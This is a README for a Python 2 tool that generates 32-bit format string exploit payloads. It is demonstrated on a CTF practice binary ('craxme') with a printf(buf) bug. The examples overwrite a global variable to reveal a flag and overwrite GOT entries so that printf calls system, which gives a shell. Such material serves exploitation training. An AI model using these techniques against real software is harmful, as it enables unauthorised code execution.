Format String Exploit Payload Generator
=======================================

* Support Python2
* Support 32 bits now(64 bits working on it)

`FormatStringExploit` object has attributes:

* printed
    * For padding or something before format string attack payload
* hij_tar
    * The address of target you want to hijack
* hij_val
    * The value you want that target to be

### Usage

I will show its usage by use example binary which has format string vulnerability.

**The author of this example binary is [Angelboy](https://github.com/scwuaptx).**

This binary src code:

```c
#include <stdio.h>

int magic = 0 ;

int main(){
	char buf[0x100];
	setvbuf(stdout,0,2,0);
	puts("Please crax me !");
	printf("Give me magic :");
	read(0,buf,0x100);
	printf(buf);
	if(magic == 0xda){
		system("cat /home/craxme/flag");
	}else if(magic == 0xfaceb00c){
		system("cat /home/craxme/craxflag");
	}else{
		puts("You need be a phd");
	}

}
```
#### First - make magic == `0xfaceb00c`

```python
from fmtexp import FmtStrExp

magic_address = 0x0804a038
password = 0xfaceb00c

fmt = FmtStrExp(printed = 0, hij_tar = magic_address, hij_val = password)
fmt = [(fmt, 4)]
payload = FmtStrExp.generate32(fmt, 7)
```

**Before trying this one, make sure you have flag in the /home/craxme**


#### Second - get shell

To get shell, we need to make magic == `0xda`, system == main, and printf == system at a time.

```python
from fmtexp import FmtStrExp

puts_got = 0x804a018
system_jmp = 0x8048416
system_got = 0x804a01c
printf_got = 0x804a010
main = 0x0804854b
magic = 0x0804a038

magic_fmt = FmtStrExp(0, magic, 0xda)
printf_got_fmt = FmtStrExp(0, printf_got, system_jmp)
system_got_fmt = FmtStrExp(0, system_got, main)
total_fmt = [(magic_fmt, 1), (printf_got_fmt, 4), (system_got_fmt, 4)]
payload = FmtStrExp.generate32(total_fmt, 7)
```
